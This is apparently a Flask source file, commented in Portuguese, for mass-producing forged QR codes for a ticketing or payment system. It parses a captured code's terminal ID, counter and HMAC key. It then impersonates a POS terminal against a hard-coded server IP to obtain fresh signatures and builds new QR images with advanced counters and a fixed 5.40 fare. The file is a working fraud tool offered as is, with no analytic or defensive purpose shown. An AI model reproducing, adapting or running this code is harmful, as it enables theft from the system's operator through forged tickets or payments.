from flask import Flask, render_template_string, request, jsonify
import requests
import qrcode
import io
import base64
import time

app = Flask(__name__)

# ENDPOINT DO SERVIDOR (COMUNICAÇÃO DIRETA)
IP_SERVIDOR = "http://35.241.41.66/"

@app.route('/api/injetar', methods=['POST'])
def api_injetar():
    data = request.json
    mtz = data['matriz']
    
    try:
        # 1. Identificação da Máquina e da Key Pública (DNA 64)
        terminal = mtz.split("i:")[1].split(";")[0]
        u_base = int(mtz.split("u:")[1].split(";")[0])
        key_hmac_publica = mtz.split("c:")[1].split(";")[0][:64] # Os 64 caracteres
    except:
        return jsonify([])

    resultados = []
    
    for i in range(data['qtd']):
        # 2. Cálculo do Salto Temporal para o novo u:
        u_novo = u_base + ((i + 1) * 15)
        ts = int(time.time())
        # Tarifa fixa de 5,40
        tarifa = "540"
        
        # 3. SEQUÊNCIA DE APRESENTAÇÃO AO SERVIDOR
        # Primeiro Terminal e Key (Identidade), depois os dados para assinar
        payload_envio = f"{terminal}{key_hmac_publica}{u_novo}{tarifa}{ts}"
        
        # O cabeçalho simula a máquina enviando um pacote de dados bruto (stream)
        headers = {
            'User-Agent': 'POS-Terminal/1.0',
            'Content-Type': 'application/octet-stream',
            'Connection': 'close'
        }
        
        try:
            # 4. Injeção no Servidor via POST
            r = requests.post(IP_SERVIDOR, data=payload_envio, headers=headers, timeout=8)
            
            if r.status_code == 200 and r.text:
                assinatura_privada = r.text.strip()
                
                # Cálculo do X dinâmico baseado no novo conjunto
                x_calc = f"{( (int(terminal) + u_novo + ts) % 100):02d}"
                
                # 5. MONTAGEM DO PAYLOAD FINAL COMPLETO
                payload_qr = f"<q:01>s:197;u:{u_novo};i:{terminal};c:{key_hmac_publica}{assinatura_privada};x:{x_calc};"
                
                # Geração da Imagem
                qr_img = qrcode.make(payload_qr)
                buf = io.BytesIO()
                qr_img.save(buf, format='PNG')
                img_b64 = base64.b64encode(buf.getvalue()).decode('utf-8')
                
                resultados.append({"u": u_novo, "img": img_b64, "x": x_calc})
        except:
            continue
            
    return jsonify(resultados)

# (O restante do código HTML do painel permanece o mesmo)
